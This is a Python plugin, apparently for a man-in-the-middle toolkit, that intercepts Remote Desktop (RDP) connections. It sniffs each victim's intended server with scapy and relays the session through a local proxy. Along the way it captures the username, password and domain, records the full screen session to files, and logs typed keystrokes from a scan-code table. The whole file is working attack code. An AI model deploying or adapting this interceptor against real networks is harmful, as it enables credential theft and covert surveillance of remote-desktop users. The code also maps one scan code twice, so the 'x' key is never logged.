# Theres no way of determining the intended RDP Server from Twisted (from what I gather at least)
# Also Sylvain (citronneur) seems to confirm this (Thanks!)
# Currently were just spawning a scapy thread to sniff the dest address

# Performance wise it seems to be ok, would like to see a pure python solution,
# this ones a little bit 'hacky' but it works

from plugins.plugin import Plugin
from libs.rdpy.core import error, rss
from libs.rdpy.core import log as Log
from libs.rdpy.protocol.rdp import rdp
from twisted.internet import reactor
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
from scapy.all import *

import os
import sys
import time
import argparse
import threading

class RDPintercept(Plugin):
	name = "RDPintercept"
	optname = "rdp"
	desc = "Intercepts RDP connections"
	has_opts = True

	def initialize(self, options):
		self.options = options
		self.rdp_port = options.port
		self.std_sec = options.std_sec
		self.privateKeyFilePath = options.p_key
		self.certificateFilePath = options.cert

		if os.geteuid() != 0:
			sys.exit("[-] RDPintercept plugin requires root privileges")

		"""
		try:
			self.ip_address = get_if_addr(options.interface)
			if self.ip_address == "0.0.0.0":
				sys.exit("[-] Interface %s does not have an IP address" % self.interface)
		except Exception, e:
			sys.exit("[-] Error retrieving interface IP address: %s" % e)
		"""

		if self.std_sec is False:
			self.clientSecurity = "ssl"
		else:
			self.clientSecurity = "rdp"

		Log._LOG_LEVEL = Log.Level.INFO

		d = DestSniffer()
		t = threading.Thread(name="dest_sniffer", target=d.start, args=(options.interface,options.port,))
		t.setDaemon(True)
		t.start()

		print "[*] RDPintercept plugin online"

	def plugin_reactor(self, strippingFactory):
		# IP and port tuple don't matter here because they will get changed on every new connection
		reactor.listenTCP(3390, ProxyServerFactory(('0.0.0.0', '3389'), "./logs/rdp_sessions", self.privateKeyFilePath, self.certificateFilePath, self.clientSecurity))

	def add_options(self, options):
		options.add_argument("--rdp-port", dest="port", type=str, default="3389", help="Port to listen on for RDP connections")
		options.add_argument("--private-key", dest="p_key", type=str, default=None, help="Path to private key [Mandatory for SSL]")
		options.add_argument("--certificate", dest="cert", type=str, default=None, help="Path to certificate [Mandatory for SSL]")
		options.add_argument("--standard-sec", dest="std_sec", action="store_true", default=False, help="RDP standard security [XP/server 2003 client or older]")

class DestSniffer:
	'''
	This sits on an interface and sniffes for incoming connections on port 3389
	then dynamically changes the dest address in ProxyServer class
	'''

	def start(self, interface, port):
		sniff(iface=interface, filter="tcp and port %s" % port, prn=self.destsniff)

	def destsniff(self, pkt):
		if pkt.haslayer(TCP) and pkt.haslayer(IP):
			ProxyServerFactory._target = (pkt[IP].dst, str(pkt[TCP].dport))
			ProxyServer._target = (pkt[IP].dst, str(pkt[TCP].dport))

class ProxyServer(rdp.RDPServerObserver):

	"""
	@summary: Server side of proxy
	"""

	scan_codes = { 0x2a : "<L-SHIFT>",
				   0x36 : "<R-SHIFT>",
				   0x1  : "<ESC>",
				   0x0e : "<BKSP>",
				   0x0f : "<TAB>",
				   0x1c : "<ENTER>",
				   0x1d : "<CTRL>",
				   0xe01d : "<R-CTRL>",
				   0x38 : "<ALT>",
				   0xe038 : "<R-ALT>",
				   0x39 : "<SPACE>",
				   0x3a : "<CAPS>",
				   0x2  : "1",
				   0x3  : "2",
				   0x4  : "3",
				   0x5  : "4",
				   0x6  : "5",
				   0x7  : "6",
				   0x8  : "7",
				   0x9  : "8",
				   0x0a : "9",
				   0x0b : "0",
				   0x0c : "-",
				   0x0d : "=",
				   0x10 : "q",
				   0x11 : "w",
				   0x12 : "e",
				   0x13 : "r",
				   0x14 : "t",
				   0x15 : "y",
				   0x16 : "u",
				   0x17 : "i",
				   0x18 : "o",
				   0x19 : "p",
				   0x1a : "[",
				   0x1b : "]",
				   0x1e : "a",
				   0x1f : "s",
				   0x20 : "d",
				   0x21 : "f",
				   0x22 : "g",
				   0x23 : "h",
				   0x24 : "j",
				   0x25 : "k",
				   0x26 : "l",
				   0x27 : ";",
				   0x28 : "'",
				   0x29 : "`",
				   0x2b : "\\",
				   0x2c : "z",
				   0x2f : "x",
				   0x2e : "c",
				   0x2f : "v",
				   0x30 : "b",
				   0x31 : "n",
				   0x32 : "m",
				   0x33 : ",",
				   0x34 : ".",
				   0x35 : "/"}

	def __init__(self, controller, target, clientSecurityLevel, rssRecorder):
		"""
		@param controller: {RDPServerController}
		@param target: {tuple(ip, port)}
		@param rssRecorder: {rss.FileRecorder} use to record session
		"""
		rdp.RDPServerObserver.__init__(self, controller)
		self._target = target
		self._client = None
		self._rss = rssRecorder
		self._clientSecurityLevel = clientSecurityLevel
		self.buff = ""
	
	def setClient(self, client):
		"""
		@summary: Event throw by client when it's ready
		@param client: {ProxyClient}
		"""
		self._client = client
		
	def onReady(self):
		"""
		@summary:  Event use to inform state of server stack
					First time this event is called is when human client is connected
					Second time is after color depth nego, because color depth nego
					restart a connection sequence
		@see: rdp.RDPServerObserver.onReady
		"""

		print self._target

		if self._client is None:
			#try a connection
			domain, username, password = self._controller.getCredentials()
			self._rss.credentials(username, password, domain, self._controller.getHostname())
			
			width, height = self._controller.getScreen()
			self._rss.screen(width, height, self._controller.getColorDepth())
			print self._target
			reactor.connectTCP(self._target[0], int(self._target[1]), ProxyClientFactory(self, width, height, 
															domain, username, password,self._clientSecurityLevel))
			
	def onClose(self):
		"""
		@summary: Call when human client close connection
		@see: rdp.RDPServerObserver.onClose
		"""
		#end scenario
		self._rss.close()
		
		#close network stack
		if self._client is None:
			return
		self._client._controller.close()
		
	def onKeyEventScancode(self, code, isPressed):
		"""
		@summary: Event call when a keyboard event is catch in scan code format
		@param code: {int} scan code of key
		@param isPressed: {bool} True if key is down
		@see: rdp.RDPServerObserver.onKeyEventScancode
		"""
		if self._client is None:
			return
		self._client._controller.sendKeyEventScancode(code, isPressed)
		
		if isPressed is True:
			try:
				self.buff += ProxyServer.scan_codes[code]
				logging.info("RDP session Keys: %s" % self.buff)
			except KeyError:
				logging.info("Error: unknown scan code %s" % hex(code))

			if len(self.buff) > 100:
				self.buff = ""

	def onKeyEventUnicode(self, code, isPressed):
		"""
		@summary: Event call when a keyboard event is catch in unicode format
		@param code: unicode of key
		@param isPressed: True if key is down
		@see: rdp.RDPServerObserver.onKeyEventUnicode
		"""
		if self._client is None:
			return
		self._client._controller.sendKeyEventUnicode(code, isPressed)
		
	def onPointerEvent(self, x, y, button, isPressed):
		"""
		@summary: Event call on mouse event
		@param x: {int} x position
		@param y: {int} y position
		@param button: {int} 1, 2 or 3 button
		@param isPressed: {bool} True if mouse button is pressed
		@see: rdp.RDPServerObserver.onPointerEvent
		"""
		if self._client is None:
			return
		self._client._controller.sendPointerEvent(x, y, button, isPressed)
		
class ProxyServerFactory(rdp.ServerFactory):
	"""
	@summary: Factory on listening events
	"""
	def __init__(self, target, ouputDir, privateKeyFilePath, certificateFilePath, clientSecurity):
		"""
		@param target: {tuple(ip, prt)}
		@param privateKeyFilePath: {str} file contain server private key (if none -> back to standard RDP security)
		@param certificateFilePath: {str} file contain server certificate (if none -> back to standard RDP security)
		@param clientSecurity: {str(ssl|rdp)} security layer use in client connection side
		"""
		rdp.ServerFactory.__init__(self, 16, privateKeyFilePath, certificateFilePath)
		self._target = target
		self._ouputDir = ouputDir
		self._clientSecurity = clientSecurity
		#use produce unique file by connection
		self._uniqueId = 0
		
	def buildObserver(self, controller, addr):
		"""
		@param controller: {rdp.RDPServerController}
		@param addr: destination address
		@see: rdp.ServerFactory.buildObserver
		"""
		print addr.host
		self._uniqueId += 1
		return ProxyServer(controller, self._target, self._clientSecurity, rss.createRecorder(os.path.join(self._ouputDir, "%s_%s_%s.rss"%(time.strftime('%Y%m%d%H%M%S'), addr.host, self._uniqueId))))
	
class ProxyClient(rdp.RDPClientObserver):
	"""
	@summary: Client side of proxy
	"""
	def __init__(self, controller, server):
		"""
		@param controller: {rdp.RDPClientController}
		@param server: {ProxyServer} 
		"""
		rdp.RDPClientObserver.__init__(self, controller)
		self._server = server
		
	def onReady(self):
		"""
		@summary:  Event use to signal that RDP stack is ready
					Inform ProxyServer that i'm connected
		@see: rdp.RDPClientObserver.onReady
		"""
		self._server.setClient(self)
		#maybe color depth change
		self._server._controller.setColorDepth(self._controller.getColorDepth())
		
	def onClose(self):
		"""
		@summary: Event inform that stack is close
		@see: rdp.RDPClientObserver.onClose
		"""
		#end scenario
		self._server._rss.close()
		self._server._controller.close()
		
	def onUpdate(self, destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data):
		"""
		@summary: Event use to inform bitmap update
		@param destLeft: {int} xmin position
		@param destTop: {int} ymin position
		@param destRight: {int} xmax position because RDP can send bitmap with padding
		@param destBottom: {int} ymax position because RDP can send bitmap with padding
		@param width: {int} width of bitmap
		@param height: {int} height of bitmap
		@param bitsPerPixel: {int} number of bit per pixel
		@param isCompress: {bool} use RLE compression
		@param data: {str} bitmap data
		@see: rdp.RDPClientObserver.onUpdate
		"""
		self._server._rss.update(destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, rss.UpdateFormat.BMP if isCompress else rss.UpdateFormat.RAW, data)
		self._server._controller.sendUpdate(destLeft, destTop, destRight, destBottom, width, height, bitsPerPixel, isCompress, data)

class ProxyClientFactory(rdp.ClientFactory):
	"""
	@summary: Factory for proxy client
	"""
	def __init__(self, server, width, height, domain, username, password, security):
		"""
		@param server: {ProxyServer}
		@param width: {int} screen width
		@param height: {int} screen height
		@param domain: {str} domain session
		@param username: {str} username session
		@param password: {str} password session
		@param security: {str(ssl|rdp)} security level
		"""
		self._server = server
		self._width = width
		self._height = height
		self._domain = domain
		self._username = username
		self._password = password
		self._security = security
		
	def buildObserver(self, controller, addr):
		"""
		@summary: Build observer
		@param controller: rdp.RDPClientController
		@param addr: destination address
		@see: rdp.ClientFactory.buildObserver
		@return: ProxyClient
		"""
		#set screen resolution
		controller.setScreen(self._width, self._height)
		#set credential
		controller.setDomain(self._domain)
		controller.setUsername(self._username)
		controller.setPassword(self._password)
		controller.setSecurityLevel(self._security)
		controller.setPerformanceSession()
		return ProxyClient(controller, self._server)
